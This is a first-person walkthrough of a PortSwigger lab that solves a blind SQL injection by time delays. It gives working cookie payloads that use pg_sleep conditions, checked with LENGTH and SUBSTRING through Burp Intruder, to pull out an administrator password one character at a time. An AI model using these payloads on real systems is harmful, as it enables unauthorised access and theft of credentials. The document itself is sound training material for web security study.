This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

####  Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

I started by visiting the shop's front page and intercepting the request containing the `TrackingId` cookie using **Burp Suite**.

I modified the cookie to introduce a conditional time delay:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

The application took approximately **10 seconds** to respond, confirming that the condition was being evaluated. I then changed the condition to `1=2`:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

This time, the response was immediate. This confirmed that the response time could be used as a **boolean oracle**, where a delay indicated a true condition.

I used the same technique to confirm the existence of the `administrator` user:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The response was delayed, confirming that the `administrator` user existed.

I then used `LENGTH(password)` to determine the length of the administrator's password:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I repeated the request with increasing password lengths until the delay disappeared. This allowed me to determine that the password was **20 characters long**.

Since testing every possible character manually would require many requests, I moved the request to **Burp Intruder** and used `SUBSTRING()` to test individual characters:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I placed the Intruder payload markers around the character being tested:

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I configured a **Simple list** containing lowercase letters and numbers (`a-z` and `0-9`). To make the timing comparison more reliable, I configured the Intruder attack to use a **single concurrent request**.

After launching the attack, I checked the **Response received** column. Most requests completed quickly, while the correct character produced a response time close to **10,000 ms**. This allowed me to identify the first character of the password.

I repeated the same process for every position by changing the `SUBSTRING()` offset from `1` to `2`, `3`, and so on until all **20 characters** of the password were recovered.